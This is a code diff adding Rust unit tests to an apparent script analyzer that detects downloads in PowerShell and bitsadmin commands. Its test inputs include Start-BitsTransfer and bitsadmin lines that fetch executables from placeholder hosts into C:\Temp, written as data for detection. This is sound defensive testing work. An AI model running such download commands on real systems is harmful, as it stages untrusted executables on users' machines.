@@ -9627,6 +9627,25 @@ mod ps1_url_extraction_tests {
     }
 
     #[test]
+    fn start_bitstransfer_source_prefix_schemeless_source_extracted() {
+        let ps = r#"Start-BitsTransfer -Dest C:\Temp\bits.exe -So bits-source-prefix.com/bits.exe"#;
+        let script = format!("powershell -Command \"{}\"\r\n", ps);
+        let report = analyze(script.as_bytes(), &Config::default());
+        let has = report.traits.iter().any(|t| {
+            matches!(t,
+                Trait::Download { src, dst, .. }
+                    if src == "http://bits-source-prefix.com/bits.exe"
+                        && dst.as_deref() == Some("C:\\Temp\\bits.exe")
+            )
+        });
+        assert!(
+            has,
+            "BITS -Source prefix abbreviation was not extracted: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
     fn start_bitstransfer_proxylist_url_is_not_promoted_to_download() {
         let ps = r#"Start-BitsTransfer -ProxyList http://bits-proxy.example:8080 -Source https://bits-proxy-actual.example/bits.exe -Destination C:\Temp\bits.exe"#;
         let script = format!("powershell -Command \"{}\"\r\n", ps);
@@ -12815,6 +12834,27 @@ $stageUrl = "ps-schemeless.example/stage.zip""#,
         assert!(
             has,
             "no structured liberal bitsadmin download: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
+    fn bitsadmin_quoted_query_ampersand_in_deob_text_is_not_command_separator() {
+        let mut env = crate::env::Environment::new(&Config::default());
+        crate::deob_scan::scan_deob_text(
+            r#"bitsadmin /transfer j1 /download /priority foreground "https://bits-query.example/a.exe?x=1&y=2" "C:\Temp\a.exe""#,
+            &mut env,
+        );
+        let has = env.traits.iter().any(|t| {
+            matches!(t,
+                Trait::BitsadminDownload { url, dst }
+                    if url == "https://bits-query.example/a.exe?x=1&y=2"
+                        && dst == "C:\\Temp\\a.exe"
+            )
+        });
+        assert!(
+            has,
+            "no structured bitsadmin download preserving quoted query ampersand: {:?}",
             env.traits
         );
     }
